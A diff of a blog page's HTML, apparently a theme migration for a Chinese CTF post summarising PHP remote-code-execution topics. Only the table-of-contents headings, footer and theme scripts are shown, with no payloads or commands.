+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#RCE%E6%80%BB%E7%BB%93"><span class="nav-text">RCE总结</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9A%E4%B9%89"><span class="nav-text">定义</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="nav-text">命令执行函数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#system"><span class="nav-text">system()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exec"><span class="nav-text">exec()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shell-exec"><span class="nav-text">shell_exec()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#passthru"><span class="nav-text">passthru()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%8B%BC%E6%8E%A5%E6%96%B9%E5%BC%8F"><span class="nav-text">系统命令拼接方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="nav-text">绕过技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#php%E5%AD%97%E7%AC%A6%E8%A2%AB%E8%BF%87%E6%BB%A4"><span class="nav-text">php字符被过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#system%E8%A2%AB%E8%BF%87%E6%BB%A4"><span class="nav-text">system被过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A9%BA%E6%A0%BC%E8%A2%AB%E8%BF%87%E6%BB%A4"><span class="nav-text">空格被过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%90%E4%BA%9B%E5%85%B3%E9%94%AE%E5%AD%97%E8%A2%AB%E8%BF%87%E6%BB%A4"><span class="nav-text">某些关键字被过滤</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8Dshell"><span class="nav-text">无数字字母shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="nav-text">应用场景</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="nav-text">方法一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="nav-text">方法二</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89"><span class="nav-text">方法三</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8Dshell%E6%8F%90%E9%AB%98%E7%AF%87"><span class="nav-text">无数字字母shell提高篇</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP7%E4%B8%8B"><span class="nav-text">PHP7下</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP5%E4%B8%8B"><span class="nav-text">PHP5下</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8Dshell%E7%9A%84%E4%B8%80%E4%BA%9Btrick"><span class="nav-text">无数字字母shell的一些trick</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E5%AD%971-0"><span class="nav-text">获取数字1 0</span></a></li></ol></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
 
 
 
                 
-              </div>
-            
-            <hr/>
-            <div>
-              <div class="post-metas my-3">
-  
-    <div class="post-meta mr-3 d-flex align-items-center">
-      <i class="iconfont icon-category"></i>
-      
 
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/ctf/" class="category-chain-item">ctf</a>
-  
-  
-
-      </span>
-    
-  
-</span>
-
-    </div>
-  
-  
-    <div class="post-meta">
-      <i class="iconfont icon-tags"></i>
-      
-        <a href="/tags/web/">#web</a>
-      
-        <a href="/tags/php/">#php</a>
-      
-        <a href="/tags/rce/">#rce</a>
-      
-    </div>
-  
-</div>
-
-
-              
-  
-
-  <div class="license-box my-3">
-    <div class="license-title">
-      <div>RCE总结</div>
-      <div>http://sloth31.github.io/2022/07/03/RCE总结/</div>
-    </div>
-    <div class="license-meta">
-      
-        <div class="license-meta-item">
-          <div>作者</div>
-          <div>Sl0th</div>
-        </div>
-      
-      
-        <div class="license-meta-item license-meta-date">
-          <div>发布于</div>
-          <div>2022年7月3日</div>
-        </div>
-      
-      
-      <div class="license-meta-item">
-        <div>许可协议</div>
-        <div>
-          
-            
-            
-              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
-              <span class="hint--top hint--rounded" aria-label="BY - 署名">
-                <i class="iconfont icon-by"></i>
-              </span>
-              </a>
-            
-              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
-              <span class="hint--top hint--rounded" aria-label="NC - 非商业性使用">
-                <i class="iconfont icon-nc"></i>
-              </span>
-              </a>
-            
-              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
-              <span class="hint--top hint--rounded" aria-label="SA - 相同方式共享">
-                <i class="iconfont icon-sa"></i>
-              </span>
-              </a>
-            
-          
-        </div>
-      </div>
-    </div>
-    <div class="license-icon iconfont"></div>
-  </div>
-
-
-
-              
-                <div class="post-prevnext my-3">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2022/07/08/Mysql%E6%8F%90%E6%9D%83/" title="Mysql提权">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Mysql提权</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2022/07/02/%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/" title="类加载机制">
-                        <span class="hidden-mobile">类加载机制</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
             </div>
 
             
-          </article>
+
         </div>
-      </div>
-    </div>
 
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-  <aside class="sidebar" style="margin-left: -1rem">
-    <div id="toc">
-  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
-  <div class="toc-body" id="toc-body"></div>
-</div>
-
-
-
-  </aside>
-
-
-    </div>
-  </div>
-</div>
-
-
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-
-
-
-
-
-    
-
-    
-      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
-    
-
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Sl0th</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        共撰写了 44 篇文章
+                    </span>
+                    
+                </p>
+            
         </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">访问人数</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">总访问量</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.7.3</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
     </div>
-  </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
 </div>
 
+        </div>
     
 
-    
-  </main>
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
 
-  <footer>
-    <div class="footer-inner">
-  
-    <div class="footer-content">
-       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
     </div>
-  
-  
-    <div class="statistics">
-  
-  
 
-  
-    
-      <span id="leancloud-site-pv-container" style="display: none">
-        总访问量 
-        <span id="leancloud-site-pv"></span>
-         次
-      </span>
-    
-    
-      <span id="leancloud-site-uv-container" style="display: none">
-        总访客数 
-        <span id="leancloud-site-uv"></span>
-         人
-      </span>
-    
-    
-
-  
+    <div class="image-viewer-container">
+    <img src="">
 </div>
 
-  
-  
-  
-</div>
 
-  </footer>
+    
 
-  <!-- Scripts -->
-  
-  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
-    })
-  </script>
+</main>
 
 
-<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
-<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
+    
+<script src="/js/libs/Swup.min.js"></script>
 
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
 
-  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var subtitle = document.getElementById('subtitle');
-      if (!subtitle || !typing) {
-        return;
-      }
-      var text = subtitle.getAttribute('data-typed-text');
-      
-        typing(text);
-      
-    })(window, document);
-  </script>
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
 
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
 
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
 
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
 
-  
-    <script  src="/js/img-lazyload.js" ></script>
-  
-
-
-
-
-  
 <script>
-  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
-    var toc = jQuery('#toc');
-    if (toc.length === 0 || !window.tocbot) { return; }
-    var boardCtn = jQuery('#board-ctn');
-    var boardTop = boardCtn.offset().top;
-
-    window.tocbot.init({
-      tocSelector     : '#toc-body',
-      contentSelector : '.markdown-body',
-      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
-      linkClass       : 'tocbot-link',
-      activeLinkClass : 'tocbot-active-link',
-      listClass       : 'tocbot-list',
-      isCollapsedClass: 'tocbot-is-collapsed',
-      collapsibleClass: 'tocbot-is-collapsible',
-      collapseDepth   : CONFIG.toc.collapseDepth || 0,
-      scrollSmooth    : true,
-      headingsOffset  : -boardTop
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
     });
-    if (toc.find('.toc-list-item').length > 0) {
-      toc.css('visibility', 'visible');
-    }
-  });
 </script>
 
 
-  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
-
-  <script>Fluid.plugins.codeWidget();</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
-    window.anchors.options = {
-      placement: CONFIG.anchorjs.placement,
-      visible  : CONFIG.anchorjs.visible
-    };
-    if (CONFIG.anchorjs.icon) {
-      window.anchors.options.icon = CONFIG.anchorjs.icon;
-    }
-    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-    var res = [];
-    for (var item of el) {
-      res.push('.markdown-body > ' + item.trim());
-    }
-    if (CONFIG.anchorjs.placement === 'left') {
-      window.anchors.options.class = 'anchorjs-link-left';
-    }
-    window.anchors.add(res.join(', '));
-  });
-</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
-    Fluid.plugins.fancyBox();
-  });
-</script>
-
-
-  <script>Fluid.plugins.imageCaption();</script>
-
-  <script defer src="/js/leancloud.js" ></script>
-
-  <script  src="/js/local-search.js" ></script>
 
 
 
 
 
-<!-- 主题的启动项，将它保持在最底部 -->
-<!-- the boot of the theme, keep it at the bottom -->
-<script  src="/js/boot.js" ></script>
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
 
 
   
+<script src="/js/libs/Typed.min.js"></script>
 
-  <noscript>
-    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
-  </noscript>
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
 </body>
 </html>
